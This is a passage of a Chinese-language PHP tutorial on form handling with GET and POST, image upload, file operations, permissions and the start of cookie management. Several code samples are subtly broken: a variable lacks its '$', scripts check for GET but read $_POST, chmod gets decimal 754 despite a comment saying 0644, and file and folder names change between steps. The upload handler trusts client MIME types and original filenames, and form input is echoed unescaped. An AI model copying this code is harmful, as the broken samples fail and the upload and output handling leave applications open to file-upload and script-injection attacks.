  \ POST 发送数据\n\n if ($_SERVER[\"REQUEST_METHOD\"] == \"GET\") {\n\n // 检索表单数据\n\n\
  \ $name = $_POST[\"lastname\"];\n\n firstname = $_POST[\"firstname\"];\n\n $email\
  \ = $_POST[\"email\"];\n\n country = $_POST[\"country\"];\n\n // 数据处理示例（显示）\n\n\
  \ echo \"Name : \" . $name . \"<br>\";\n\n echo \"First name : \" . $firstname .\
  \ \"<br>\";\n\n echo \"Email : \" . $email . \"<br>\";\n\n echo \"Country : \" .\
  \ $country . \"<br>\";\n\n }else{\n\n // 如果请求方法不是 POST，则显示错误消息\n\n echo \"Error:\
  \ Access not authorized.\";\n\n }\n\n?>\n```\n\n##### Processingform.php\n\n```php\n\
  <?php\n\n // 检查是否已通过 POST 发送数据\n\n if ($_SERVER[\"REQUEST_METHOD\"] == \"GET\")\
  \ {\n\n // 检查 $_GET 中是否有预期数据\n\n if (empty($_GET[\"lastname\"])) {\n\n echo \"Please\
  \ enter your last name!\";\n\n } elseif (empty($_GET[\"firstname\"])) {\n\n echo\
  \ \"Please enter your first name!\";\n\n } elseif (empty($_GET[\"email\"]) || !filter_var($_GET[\"\
  email\"], FILTER_VALIDATE_EMAIL)) {\n\n echo \"Please enter a valid email!\";\n\n\
  \ } elseif (empty($_GET[\"country\"])) {\n\n echo \"Please select your country!\"\
  ;\n\n } else {\n\n // 检索表单数据\n\n $lastname = $_GET[\"lastname\"];\n\n $firstname\
  \ = $_GET[\"firstname\"];\n\n $email = $_GET[\"email\"];\n\n $country = $_GET[\"\
  country\"];\n\n // 数据处理示例（显示）\n\n echo \"Last Name : \" . $lastname . \"<br>\";\n\
  \n echo \"First Name : \" . $firstname . \"<br>\";\n\n echo \"Email : \" . $email\
  \ . \"<br>\";\n\n echo \"Country : \" . $country . \"<br>\";\n\n }\n\n } else {\n\
  \n // 如果请求方法不是 POST，则显示错误消息\n\n echo \"Error: Access not authorized\";\n\n }\n\n\
  ?>\n```\n\n当你填写表单并点击“Send”（发送）按钮提交时，将获得类似如下的结果：\n\n![Image](img/image-120.png)\n\
  \n请注意，你的表单内容已通过浏览器的 URL 地址传输。换句话说，GET 方法将数据作为查询字符串发送在 URL 中，使其易于查看和共享。\n\n然而，重要的是要注意，不建议使用\
  \ GET 方法发送敏感数据（如密码），因为该数据在 URL 中可见，可能被第三方拦截。在这种情况下，首选 POST 方法，因为它在 HTTP 请求体中发送数据，可见性较低。\n\
  \n此外，与 POST 方法相比，GET 方法有几个局限性：\n\n**数据大小限制**：通过 GET 方法传输的数据大小受限，因为它包含在 URL 中。这对于大量或敏感数据可能是个问题。\n\
  \n**数据安全性**：由于数据在 URL 中可见，第三方可以轻松拦截和读取。这可能会危及密码或个人信息等敏感数据的安全性。\n\n**特殊字符限制**：URL\
  \ 中的某些特殊字符必须进行编码，如果处理不当，可能导致错误或数据丢失。\n\n**浏览器缓存**：通过 GET 方法传输的数据可能被浏览器缓存，如果用户共享包含敏感数据的\
  \ URL，可能导致机密性问题。\n\n总之，虽然 GET 方法简单易用，适合少量非敏感数据，但在安全性、数据大小和特殊字符处理方面存在显著局限性。对于敏感或大量数据，建议使用\
  \ POST 方法。\n\n### 第 8 章：图像和文件\n\n图像和文件操作是现代 Web 开发的重要组成部分。在本章中，我们将重点关注两个主要方面：发送和显示图像及文件，以及在服务器上管理这些文件。\n\
  \n首先，我们将探讨从 HTML 表单向 PHP 服务器发送图像和文件的过程。我们将了解如何在服务器端处理这些数据，检查文件类型和大小，然后将其保存在服务器上。接下来，我们将学习如何在网页中显示这些图像，使用适当的\
  \ HTML 标签。\n\n随后，我们将研究服务器端的文件管理。我们将介绍创建、读取、写入和删除文件等常见操作。我们将了解如何操作目录、列出文件以及其他文件管理操作。\n\
  \n本章将带你深入了解 PHP 中的图像和文件操作，为你提供在 Web 应用程序中有效管理多媒体资源和文件所需的知识和技能。\n\n#### 发送和显示图像或文件\n\
  \n使用表单发送和显示图像或文件的过程可分为几个阶段：\n\n*   **创建上传表单**：首先，你需要创建一个 HTML 表单，允许用户从其设备选择并上传文件到服务器。你可以使用类型为\
  \ \"file\" 的 `<input>` 标签来创建用于选择文件的表单字段。\n*   **表单处理**：用户提交表单后，文件数据被发送到服务器。你随后需要创建\
  \ PHP 代码来处理这些数据。此代码可以集成在同一个表单脚本中，也可以位于独立的 PHP 脚本中。该代码必须检查文件是否已正确发送、是否符合你定义的文件大小和类型限制，然后将其保存在服务器上。\n\
  *   **在网页上显示图像**：图像发送并保存在服务器上后，你可以使用 HTML 的 `<img>` 标签在网页上显示它。你必须在 `<img>` 标签的 \"\
  src\" 属性中指定图像的路径。\n\n##### 创建发送表单\n\n以下是说明该过程的代码示例：\n\n在 `index.php` 文件中，创建以下表单：\n\
  \n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n\n <meta charset=\"UTF-8\"\
  >\n\n <title>Image submission form</title>\n\n</head>\n\n<body>\n```\n\n\n\n\n<form\
  \ action=\"\" method=\"post\" enctype=\"multipart/form-data\">\n\n<label for=\"\
  file\">Select an image to send:</label>\n\n<input type=\"file\" name=\"file\" id=\"\
  file\" capture=\"Select File\">\n\n<input type=\"submit\" value=\"Send\">\n\n</form>\n\
  \n</body>\n\n</html>\n\n此 HTML 表单用于允许用户将文件（特别是图像）发送到 Web 服务器。\n\n`<form action=\"\
  \" method=\"post\" enctype=\"multipart/form-data\">`：此 `<form>` 标签定义表单的开始。`action`\
  \ 属性指定数据处理脚本的 URL（此处为空，表示提交到同一页面），`method` 属性指定发送数据所用的 HTTP 方法，此处为 \"post\"。`enctype`\
  \ 属性定义表单的内容类型，发送文件时为 \"multipart/form-data\"。\n\n以下是表单概览：\n\n![Image](img/image-121.png)\n\
  \n简而言之，此表单允许用户选择要发送的文件，然后提交表单，以便通过 POST 方法并以 \"multipart/form-data\" 内容类型将文件传输到服务器。\n\
  \n#### 表单处理\n\n下一步是在项目结构中创建一个名为 \"uploads\" 的目录，用于存储上传的图像。然后，在 `index.php` 文件中，紧接在表单之前，我们集成\
  \ PHP 代码来管理通过表单传输的数据。\n\n```php\n\n// Check that the file has been sent correctly\n\
  \nif ($_SERVER[\"REQUEST_METHOD\"] == \"POST\" && isset($_FILES[\"file\"])){\n\n\
  $file = $_FILES[\"file\"];\n\n// Check if the file is a JPEG or PNG image\n\n$allowed_types\
  \ = [\"image/jpeg\", \"image/png\"];\n\nif (in_array($file[\"type\"], $allowed_types))\
  \ {\n\n// Move file to destination directory on server\n\n$destination = \"uploads/\"\
  .$file[\"name\"];\n\nmove_uploaded_file($file[\"tmp_name\"], $destination);\n\n\
  echo \"The image has been uploaded successfully.\";\n\n} else {\n\necho \"Error:\
  \ Please select an image in JPEG or PNG format.\";\n\n}\n\n}\n\n?>\n```\n\n此 PHP\
  \ 代码用于检查和处理通过 HTML 表单发送的文件，特别是在服务器上上传和保存图像。\n\n*   第一行代码检查请求方法是否为 `POST`，以及文件是否已以键\
  \ \"file\" 发送到 `$_FILES` 超全局变量。\"file\" 是表单 \"name\" 属性的值。\n*   接下来，创建一个 `$file`\
  \ 变量并用下载的文件数据进行初始化，这些数据从 `$_FILES` 超全局变量中提取。\n*   在名为 `$allowed_types` 的数组中定义了一个授权图像类型列表，本例中为\
  \ \"image/jpeg\" 和 \"image/png\"。\n*   使用 `in_array()` 函数检查下载文件的类型是否为 `$allowed_types`\
  \ 数组中定义的允许类型之一。\n*   如果是，则使用 `move_uploaded_file()` 函数将文件从临时文件夹移动到 `$destination`\
  \ 变量中指定的目标目录。临时文件由 `$_FILES[\"file\"][\"tmp_name\"]` 指定，文件名在 `$file[\"name\"]` 中保持不变。\n\
  *   如果文件类型未获授权，则显示一条错误消息，提示用户选择 JPEG 或 PNG 格式的图像。\n\n此代码确保仅接受 JPEG 或 PNG 文件并将其上传到服务器，从而保证数据的安全性和完整性。\n\
  \n要测试您的代码，请遵循以下简单步骤：运行 `index.php` 文件，从您的设备中选择一张图像，然后提交表单。如果您选择的图像符合指定的允许类型，它将保存在您之前创建的\
  \ \"uploads\" 目录中。\n\n![Image](img/image-122.png)\n\n但请注意，存储文件的目录必须可写且可读。根据您的操作系统，您可能需要授予该目录读取和写入访问权限。\n\
  \n#### 在网页中显示图像\n\n第三步是显示通过表单传输的图像。为此，我们创建一个名为 `display_image.php` 的文件：\n\n```html\n\
  <!DOCTYPE html>\n\n<html lang=\"en\">\n\n<head>\n\n<meta charset=\"UTF-8\">\n\n\
  <title>Image display</title>\n\n</head>\n\n<body>\n\n<h1>Image sent:</h1>\n\n<!--\
  \ Display uploaded image -->\n\n<?php\n\n$image_path = \"uploads/php.png\"; // Path\
  \ to image saved on server\n\necho '<img src=\" ' . $image_path . ' \" width=\"\
  960\" alt=\"Image\">';\n\n?>\n\n</body>\n\n</html>\n```\n\n此带有 PHP 标签的 HTML 代码用于在网页上显示图像。\n\
  \n*   `$image_path = \"uploads/php.png\";`：定义服务器上保存的图像路径。\n*   `echo '<img src=\"\
  \ ' . $image_path . ' \" width = 960 alt=\"Image\" >';`：使用 `<img>` 标签显示图像，其中 `src`\
  \ 属性指定图像路径，`alt` 提供图像的替代文本（对无障碍访问很有用），`width` 定义其宽度（以像素为单位）。\n\n![Image](img/image-123.png)\n\
  \n#### 文件管理\n\n文件管理是 PHP Web 开发的重要组成部分，因为它允许您操作服务器上的文件并与之交互。本节将介绍读取、写入、创建和删除文件等基本操作。\n\
  \n##### 文件读取\n\n###### 使用 `file_get_contents()`\n\n`file_get_contents()` 函数将文件的完整内容读入字符串。此方法适用于内容可存储在内存中的小文件。\n\
  \n例如：\n\n首先，在 \"ebookphp\" 项目的根目录下创建一个名为 \"filetext\" 的目录。在此目录中，保存一个名为 \"poem1.txt\"\
  \ 的文本文件，其中包含莎士比亚最著名的诗作之一的片段。\n\n以下是 \"poem1.txt\" 文件的内容：\n\n![Image](img/image-124.png)\n\
  \n在 `index.php` 文件中，我们放置将读取 poem1.txt 文件内容的代码：\n\n```php\n\n// Read the contents\
  \ of a file in a string\n\n$content = file_get_contents('filetext/poem1.txt');\n\
  \n// Display the contents of the file\n\necho $content;\n\n?>\n```\n\n此 PHP 代码读取位于\
  \ \"filetext\" 目录中名为 \"poem1.txt\" 的文本文件的内容（这是莎士比亚最著名的诗作之一）。`file_get_contents()`\
  \ 函数用于读取文件内容并将其存储在名为 `$content` 的变量中。然后使用 `echo $content;` 命令在屏幕上显示文件内容。\n\n运行 `index.php`\
  \ 将产生以下结果：\n\n![Image](img/image-125.png)\n\n结果显示，显示 \"poeme.txt\" 文件内容时未保留换行符。要在使用\
  \ `file_get_contents()` 读取文件时保留换行符，可以使用 PHP 预定义的 `nl2br()` 函数将换行符转换为 HTML `<br>`\
  \ 标签。这使得换行符能在 HTML 上下文中正确显示。\n\n以下是如何修改示例以包含 `nl2br()` 函数：\n\n```php\n\n// Read\
  \ the contents of a file in a string\n\n$content = file_get_contents('filetext/poem1.txt');\n\
  \n// Convert line breaks into HTML tags <br>\n\n$content_with_br = nl2br($content);\n\
  \n// Display file contents with line breaks preserved\n\necho $content_with_br;\n\
  \n?>\n```\n\n通过此修改，poeme.txt 文件中的换行符将在您的 HTML 页面中正确显示。\n\n![Image](img/image-126.png)\n\
  \n简而言之，`file_get_contents()` 函数用于在 PHP 中将文件内容作为字符串读取。它便于从文本文件、CSV 文件甚至网页中提取文本内容。此函数使用简单，以字符串形式返回文件的完整内容，便于在\
  \ PHP 代码中操作。\n\n###### 使用 `fopen()`、`fread()` 和 `fclose()`\n\n为了更受控、更高效地读取大文件，可以使用\
  \ `fopen()`、`fread()` 和 `fclose()` 函数。`fopen()` 打开文件，`fread()` 从文件中读取指定字节数，`fclose()`\
  \ 在读取后关闭文件。\n\n以下是如何使用它们来读取文件内容：\n\n\n\n\n\n### PHP 文件操作\n\n#### fopen() 函数\n\n\
  **`fopen()`** 函数用于打开文件或 URL，并返回文件指针。它接受两个参数：要打开的文件名和打开模式（读、写等）。语法如下：\n\n![Image](img/image-127.png)\n\
  \n打开模式指定文件如何被打开。以下是一些常用模式：\n\n- **`\"r\"`**：以只读模式打开文件。文件指针指向文件开头。\n- **`\"w\"`**：以只写模式打开文件。清空现有内容，若文件不存在则创建新文件。文件指针指向文件开头。\n\
  - **`\"a\"`**：以只写模式打开文件。文件指针指向文件末尾。若文件不存在则尝试创建。\n- **`\"r+\"`**：以读写模式打开文件。文件指针指向文件开头。\n\
  \n`fopen()` 函数返回的文件指针供其他文件操作函数（如 `fread()`、`fwrite()` 等）使用。若 `fopen()` 失败，则返回 `FALSE`。\n\
  \n##### 示例\n\n```php\n<?php\n$handle = fopen(\"filetext/poem1.txt\", \"r\");\n?>\n\
  ```\n\n---\n\n#### 读取文件内容\n\n使用 `fopen()` 打开文件后，下一步是读取其内容。PHP 提供了多个函数来完成此任务，包括 `fread()`、`fgets()`\
  \ 和 `fgetc()`。每个函数提供不同的读取方式。\n\n##### `fread()` 函数\n\n**`fread()` 函数**用于从 `fopen()`\
  \ 打开的文件中读取指定字节数。它接受两个参数：`fopen()` 返回的文件指针和要读取的字节数。若需读取整个文件，可使用 `filesize()` 函数获取文件总大小，只需提供文件名即可。\n\
  \n```php\n<?php\n$handle = fopen(\"filetext/poem1.txt\", \"r\");\n$content = fread($handle,\
  \ filesize(\"filetext/poem1.txt\"));\necho $content;\n?>\n```\n\n执行此代码将打开 `poeme.txt`\
  \ 文件并以只读方式访问其全部内容。\n\n![Image](img/image-128.png)\n\n若需读取特定字节数，只需将该字节数作为第二个参数传给\
  \ `fread()`。例如，以下代码仅读取前 50 字节：\n\n```php\n<?php\n$handle = fopen(\"filetext/poem1.txt\"\
  , \"r\");\n$content = fread($handle, 50);\necho $content;\n?>\n```\n\n结果：\n\n![Image](img/image-129.png)\n\
  \n##### `fgets()` 函数\n\n**`fgets()` 函数**用于从 `fopen()` 打开的文件中读取一整行。它接受 `fopen()`\
  \ 返回的文件指针作为参数。该函数读取直到行尾字符（通常是换行符或回车符），并返回包含行尾字符的字符串。若到达文件末尾，则返回 `false`。\n\n```php\n\
  <?php\n$handle = fopen(\"filetext/poem1.txt\", \"r\");\n$content = fgets($handle);\n\
  echo $content;\n?>\n```\n\n结果：\n\n![Image](img/image-130.png)\n\n##### `fgetc()`\
  \ 函数\n\n**`fgetc()` 函数**用于从 `fopen()` 打开的文件中逐字符读取。它接受 `fopen()` 返回的文件指针作为参数。每次调用\
  \ `fgetc()` 会将文件指针前移一个字符，并返回读取到的字符字符串。若到达文件末尾，则返回 `false`。\n\n以下示例中，`fgetc()` 函数将执行六次，显示文件的前六个字符：\n\
  \n```php\n<?php\n$handle = fopen(\"filetext/poem1.txt\", \"r\");\necho fgetc($handle);\n\
  echo fgetc($handle);\necho fgetc($handle);\necho fgetc($handle);\necho fgetc($handle);\n\
  echo fgetc($handle);\n?>\n```\n\n结果：\n\n![Image](img/image-131.png)\n\n要使用 `fgetc()`\
  \ 读取整个文件内容，可在 `while` 循环中调用它，直到返回 `false` 表示文件结束。\n\n```php\n<?php\n$file = fopen(\"\
  filetext/poem1.txt\", \"r\");\nif ($file) {\n    // 逐字符读取循环\n    while (($char =\
  \ fgetc($file)) !== false) {\n        echo $char;\n    }\n}\n?>\n```\n\n这段 PHP 代码使用\
  \ `fopen()` 以读模式打开 `poeme.txt` 文件。若文件打开成功（即 `$file` 不等于 `false`），则启动 `while` 循环。每次迭代使用\
  \ `fgetc()` 读取一个字符，循环条件检查返回值是否不为 `false`（即仍有字符可读）。若是，则使用 `echo` 输出该字符。循环重复直到文件末尾，此时\
  \ `fgetc()` 返回 `false`，循环终止。\n\n---\n\n#### `fclose()` 函数\n\n**`fclose()` 函数**用于关闭之前用\
  \ `fopen()` 打开的文件。它接受 `fopen()` 返回的文件指针作为参数。\n\n##### 使用示例\n\n```php\n<?php\n$handle\
  \ = fopen(\"filetext/poem1.txt\", \"r\");\nif ($handle) {\n    $content = fread($handle,\
  \ filesize(\"filetext/poem1.txt\"));\n    echo $content;\n    fclose($handle); //\
  \ 关闭文件\n} else {\n    echo \"Unable to open file\";\n}\n?>\n```\n\n此代码使用 `fopen()`\
  \ 以读模式打开 `poeme.txt` 文件。若打开成功，则使用 `filesize()` 获取文件大小，用 `fread()` 将内容读入变量，并用 `echo`\
  \ 显示。读取完成后，使用 `fclose()` 关闭文件并释放资源。若文件无法打开，则显示错误信息。\n\n---\n\n#### 文件创建\n\n在 PHP\
  \ 中创建文件是常见操作，可使用内置函数轻松完成。以下是创建新文件的方法：\n\n##### 使用 `fopen()` 函数\n\n创建文件的第一步是使用 `fopen()`\
  \ 函数。该函数打开文件，若文件不存在则创建。示例如下：\n\n```php\n<?php\n// 以写模式打开文件（若不存在则创建新文件）\n$handle\
  \ = fopen(\"filetext/new_file.txt\", \"w\");\n// 检查文件是否打开成功\nif ($handle !== false)\
  \ {\n    echo \"The file has been created successfully!\";\n    fclose($handle);\
  \ // 使用后关闭文件\n} else {\n    echo \"Impossible to create the file\";\n}\n?>\n```\n\
  \n此例中，我们使用 `fopen()` 以写模式（`\"w\"`）打开名为 `nouveau_fichier.txt` 的文件。若文件不存在，`fopen()`\
  \ 将创建它。打开成功则显示成功消息，否则显示错误消息。\n\n`fopen()` 函数还可用于以其他模式打开文件，如只读（`\"r\"`）、读写（`\"r+\"\
  `）、追加（`\"a\"`）等。\n\n此步骤是在向文件写入数据前创建文件的关键步骤。\n\n若代码无错误执行，将显示消息 \"The file has been\
  \ created successfully\"，并在 `filetext` 目录下创建一个名为 `nouveau_fichier.txt` 的新空文件。\n\n\
  ![Image](img/image-132.png)\n\n---\n\n#### 写入文件\n\n在 PHP 中写入文件是生成数据文件、活动日志或报表时的常见操作。PHP\
  \ 提供了多种写入文件的方法，为不同开发需求提供了极大灵活性。本节将探讨 PHP 中写入文件的不同方式。\n\n##### 使用 `fwrite()` 函数\n\
  \n文件成功打开后，可使用 `fwrite()` 函数向其写入数据。\n\n**`fwrite()` 函数**用于向文件写入数据。它通常接受三个参数：文件指针（通常由\
  \ `fopen()` 返回）、要写入的字符串，以及可选的要写入字符串的长度。若未指定长度，`fwrite()` 将写入整个提供的字符串。\n\n\n\n\n\
  `fwrite()` 函数返回写入文件的字节数，出错时返回 `FALSE`。它通常与 `fopen()` 函数结合使用，以写入模式打开文件。数据写入后，我们建议使用\
  \ `fclose()` 函数关闭文件以释放系统资源。\n\n以下是使用 `fwrite()` 写入文件的示例：\n\n```php\n<?php\n\n//\
  \ 以写入模式打开文件\n\n$file = fopen(\"filetext/new_file.txt\", \"w\");\n\n// 向文件写入字符串\n\
  \n$data = \"This is an example of content to be written to the file.\";\n\nfwrite($file,\
  \ $data);\n\n// 关闭文件\n\nfclose($file);\n\n?>\n```\n\n在本例中，`fopen()` 函数以写入模式 (\"\
  w\") 打开名为 \"nouveau_fichier.txt\" 的文件。接着，`fwrite()` 函数将存储在 `$data` 变量中的字符串写入该文件。最后，`fclose()`\
  \ 函数关闭新创建的文件。\n\n##### 使用 `file_put_contents()` 函数\n\nPHP 中的 `file_put_contents()`\
  \ 函数用于将数据写入文件。它接受要写入的文件路径、要写入的数据以及可能的附加选项作为参数。\n\n使用 `file_put_contents()` 写入文件的示例：\n\
  \n```php\n<?php\n\n// 要写入文件的数据\n\n$data = \"Content to be written to the file.\"\
  ;\n\n// 目标文件路径\n\n$filename = \"filetext/new_file.txt\";\n\n// 将数据写入文件\n\nfile_put_contents($filename,\
  \ $data);\n\n?>\n```\n\n这段 PHP 代码使用 `file_put_contents()` 函数将数据写入文件。`$data` 变量存储要写入的内容，`$filename`\
  \ 变量存储将要写入数据的目标文件路径。随后使用 `$data` 和 `$filename` 两个变量作为参数调用 `file_put_contents` 函数。该函数非常实用，因为它将写入数据到文件简化为单行代码。\n\
  \n请注意，如果文件不存在，此函数也会负责创建文件，并处理写入错误。\n\n如果成功运行此代码，你会发现 `$data` 变量中包含的文本已替换指定文件的所有先前内容。但是，如果你希望保留现有内容并在之后追加新文本，有几种选项可用。接下来，我们将使用\
  \ PHP 提供的一个名为 `FILE_APPEND` 的常量。此常量允许我们将数据追加到文件末尾，而不是完全覆盖它。\n\n要使用此常量，只需将 `FILE_APPEND`\
  \ 作为第三个参数添加到 `file_put_contents()` 函数中。这会指示 PHP 将新数据追加到文件末尾，从而保留现有内容。\n\n以下是修改 `file_put_contents()`\
  \ 函数以使用 `FILE_APPEND` 常量的方法：\n\n```php\n<?php\n\n// 要写入文件的数据\n\n$data = \"Content\
  \ to be written to the file.\";\n\n// 目标文件路径\n\n$filename = \"filetext/new_file.txt\"\
  ;\n\n// 将数据写入文件\n\nfile_put_contents($filename, $data, FILE_APPEND);\n\n?>\n```\n\
  \n通过此修改，新内容将被添加到文件末尾，而不会覆盖现有数据。\n\n#### 删除文件\n\nPHP 中的文件删除可使用 `unlink()` 函数执行。该函数接受要删除的文件路径作为参数，删除成功返回\
  \ `true`，否则返回 `false`。\n\n以下是使用 `unlink()` 函数删除文件的示例：\n\n```php\n<?php\n\n// 要删除的文件路径\n\
  \n$filename = \"filetext/new_file.txt\";\n\n// 删除文件\n\nif (unlink($filename)) {\n\
  \necho \"The file has been deleted successfully.\";\n\n} else {\n\necho \"Error:\
  \ Unable to delete file.\";\n\n}\n\n?>\n```\n\n结果：\n\n![Image](img/image-133.png)\n\
  \n在本例中，`unlink()` 函数用于删除 `$filename` 路径指定的文件。如果删除成功，将显示一条消息指示文件已成功删除。否则，将显示错误消息。\n\
  \n重要的是要注意，删除文件是永久且不可逆的操作。因此，使用 `unlink()` 函数时建议小心谨慎，以免意外删除文件。\n\n#### 高级文件处理\n\n\
  PHP 中的高级文件操作涉及移动文件、更改权限、检查文件是否存在等操作。本节将探讨各种可用于执行这些高级文件操作的 PHP 函数。\n\n##### 移动文件\n\
  \nPHP 中可使用 `rename()` 函数移动文件。此函数允许你重命名或将文件/文件夹移动到新的指定位置。以下是使用 `rename()` 函数移动文件的示例：\n\
  \n让我们在 eBoophp 项目的根目录下创建一个名为 \"destination_folder\" 的新文件夹。在 \"filetext\" 目录中，我们已经创建了一个名为\
  \ \"poeme.txt\" 的文件。接下来，我们将把这个文件移动到新的 \"destination_folder\" 目录中。\n\n但请注意，存放文件的目录必须可写且可读。视操作系统而定，你可能需要授权该目录的读写访问权限。\n\
  \n```php\n<?php\n\n// 源文件路径\n\n$source = \"filetext/poem1.txt\";\n\n// 目标路径\n\n\
  $destination = \"new_folder/poem1.txt\";\n\n// 移动文件\n\nif (rename($source, $destination))\
  \ {\n\necho \"The file has been successfully moved\";\n\n} else {\n\necho \"Error:\
  \ Unable to move file.\";\n\n}\n\n?>\n```\n\n在本例中，`rename()` 函数用于将 `$source` 路径指定的文件移动到\
  \ `$destination` 路径。如果移动成功，将显示一条消息指示文件已成功移动。否则，将显示错误消息。请注意，你可以为移动后的文件指定新名称。\n\n\
  ##### 更改权限\n\nPHP 中可使用 `chmod()` 函数更改文件权限。此函数允许你通过以八进制数指定新权限来更改文件的访问权限。每个文件有三组权限，分别针对不同类型的用户：文件所有者、文件关联组和其他用户。每组权限用一个数字表示。\n\
  \n![Image](img/image-134.png)\n\n示例：\n\n- **7** (4 + 2 + 1)：表示所有者拥有读、写和执行权限。\n-\
  \ **6** (4 + 2)：表示所有者拥有读和写权限，但无执行权限。\n- **5** (4 + 1)：表示所有者拥有读和执行权限，但无写权限。\n\n因此数字\
  \ **641** 授予文件所有者读写权限 (6 = 4 + 2)，用户组仅读权限 (4)，其他用户仅执行权限 (1)。\n\n以下是使用 `chmod()`\
  \ 函数更改文件权限的示例：\n\n```php\n<?php\n\n// 文件路径\n\n$filename = \"new_folder/poem1.txt\"\
  ;\n\n// 新权限（例如 0644 表示所有者读写，用户组读，其他用户读）\n\n$new_permissions = 754;\n\n// 更改文件权限\n\
  \nif (chmod($filename, $new_permissions)) {\n\necho \"File permissions have been\
  \ successfully modified\";\n\n} else {\n\necho \"Error: Unable to change file permissions\"\
  ;\n\n}\n\n?>\n```\n\n在本例中，`chmod()` 函数用于修改 `$filename` 路径指定文件的权限，使用指定的新权限。如果修改成功，将显示一条消息指示文件权限已成功修改。否则，将显示错误消息。`$new_permissions`\
  \ 变量中指定的值 754 授予所有者所有权限 (7 = 4+2+1)，用户组读和执行权限 (5 = 4+1)，其他用户仅读权限 (4)。\n\n**注意：**\n\
  \n请确保你尝试修改权限的文件实际存在于指定位置，且路径正确。如果你在本地计算机上运行此代码，请确保你的用户拥有修改指定目录中文件权限所需的权限。\n\n#####\
  \ 文件存在性检查\n\n\n\n### 在 PHP 中检查文件是否存在\n\n在 PHP 中检查文件是否存在可以使用 `file_exists()` 函数。该函数检查指定位置是否存在文件或目录。以下是使用\
  \ `file_exists()` 函数检查文件是否存在的示例：\n\n```php\n<?php\n\n// 文件路径\n$filename = \"new_folder/poem1.txt\"\
  ;\n\n// 检查文件是否存在\nif (file_exists($filename)) {\n    echo \"The file exists\";\n\
  } else {\n    echo \"The file does not exist\";\n}\n\n?>\n```\n\n在本例中，`file_exists()`\
  \ 函数用于检查 `$filename` 路径指定的文件是否存在。如果文件存在，则显示一条指示文件存在的消息。否则，显示一条指示文件不存在的消息。\n\n####\
  \ 总结\n\n在本章专门介绍 PHP 中图像和文件操作的内容里，我们深入探讨了这门编程语言提供的强大功能。我们详细探讨了加载、显示、读取和写入文件所涉及的各个步骤，以及移动和删除文件的高级方法。通过掌握这些基本技能，你现在已具备创建动态、交互式\
  \ Web 应用程序的能力，能充分发挥图像和文件的潜力。凭借你对这些概念的深入理解和对 PHP 工具的熟练掌握，你已准备好迎接最苛刻的 Web 开发挑战。\n\n\
  ### 第 9 章：Session 与 Cookie 管理\n\nSession 和 Cookie 是开发交互式和动态 Web 应用程序的关键要素。它们存储并维护关于服务器和客户端的信息，使个性化用户体验和跟踪浏览活动变得更加容易。\n\
  \nSession 和 Cookie 在 Web 开发中被广泛用于各种功能，包括：\n\n*   **认证与授权管理**：Session 和 Cookie 用于维护用户登录状态并限制对网站某些部分的访问。\n\
  *   **临时数据存储**：Session 用于存储执行特定功能所需的临时数据，例如在线商店中的购物车。\n*   **个性化用户体验**：通过存储用户偏好（如语言、主题等），Cookie\
  \ 使你能够个性化浏览体验。\n*   **跟踪浏览活动**：Cookie 用于收集用户与网站交互的数据，使我们能够分析趋势并个性化内容。\n\n在本章中，我们将详细探讨\
  \ PHP 中 Cookie 和 Session 的管理，以及与其使用相关的最佳实践和安全注意事项。\n\n#### Cookie 管理\n\nCookie 是由\
  \ Web 浏览器存储在用户计算机上的小型文本文件。它们在现代网站的运行和个性化中发挥着关键作用。Cookie 使网站能够记住用户偏好、跟踪其活动并提供个性化体验。\n\
  \n在本节中，我们将详细探讨 PHP 中的 Cookie 管理，包括 Cookie 的创建、读取、修改和删除，以及 Web 开发中使用 Cookie 相关的良好安全实践。\n\
  \n一般来说，Web 浏览器与 Web 服务器之间交换 Cookie（存储在客户端，在服务端访问和操作以实现各种功能）的过程可以总结如下：\n\n1.  过程始于\
  \ Web 浏览器向 Web 服务器发送 HTTP 请求以访问页面或执行特定操作。\n2.  Web 服务器通过发送 HTTP 头（包括 Cookie）来响应此请求。Cookie\
  \ 是存储在浏览器中的小段数据，使得在用户与网站交互时能够跟踪和识别用户。\n3.  浏览器将这些 Cookie 存储在客户端，并将其与服务器指定的域和路径关联。\n\
  4.  Web 服务器向浏览器发送 HTTP 响应，其中可能包含要显示或处理的其他数据。\n5.  当浏览器向服务器发送新的 HTTP 请求时（例如，访问网站上的其他页面），它会自动包含与网站域和路径关联的\
  \ Cookie。\n6.  服务器使用 PHP 中的 `$_COOKIE` 超全局变量检索这些服务端 Cookie，从而允许在服务端脚本中根据需要访问和操作它们。\n\
  7.  可以在服务端操作 Cookie 以实现各种功能，如用户认证跟踪、内容个性化、偏好跟踪等。\n8.  随着浏览器发送的每个后续请求，相关的 Cookie\
  \ 都会被自动包含，使服务器能够继续使用它们来个性化用户体验。\n\n下图总结了客户端 Web 浏览器与 Web 服务器之间的 Cookie 交换过程：\n\n\
  ![Image](img/image-135.png)\n\n简而言之，Cookie 用于存储客户端信息并随每个请求将其传输到服务器，使服务器能够维护应用程序状态并个性化用户体验。\n\
  \n##### 创建和发送 Cookie\n\n要在 PHP 中创建 Cookie，请使用 `setcookie()` 函数。该函数接受多个参数，包括 Cookie\
  \ 名称、值、有效期（可选）、路径（可选）和域（可选）。\n\n![Image](img/image-136.png)\n\n*   **name**：Cookie\
  \ 的名称。\n*   **value**：与 Cookie 关联的值。\n*   **expire**：可选，以 Unix 时间戳指定 Cookie 的过期日期。如果未指定，Cookie\
  \ 将在会话结束时过期。\n*   **path**：可选，指定 Cookie 可用的服务器路径。默认情况下，它在整个网站可用。\n*   **domain**：可选，指定\
  \ Cookie 可用的域。默认情况下，它可用于当前域。\n*   **secure**：可选，指定 Cookie 是否应仅通过 HTTPS 传输。默认设置为\
  \ false。\n*   **httponly**：可选，指定 Cookie 是否仅可通过 HTTP 访问，而不能通过 JavaScript 访问。默认设置为\
  \ false。\n\nCookie 可以存储各种类型的信息，如会话标识符、用户偏好、语言设置、跟踪数据等。以下是一个可以存储在 Cookie 中的实际示例：\n\
  \n假设一个网站允许用户从一系列主题中选择他们喜欢的主题。一旦用户选择了主题，网站就可以将此信息存储在 Cookie 中，以便下次访问时，他们将看到之前选择的相同主题。\n\
  \n在 Cookie 中存储首选主题的代码示例：\n\n```php\n<?php\n\n// 设置 Cookie 名称和值\n$name = \"user\"\
  ;\n$theme_value = \"Alice Dupont\";\n\n// 设置 Cookie 生命周期（1 小时）\n$expiration = time()\
  \ + 3600; // 当前时间戳 + 3600 秒（1 小时）\n\n// 设置 Cookie 有效的路径（整个网站）\n$path = \"/\";\n\n\
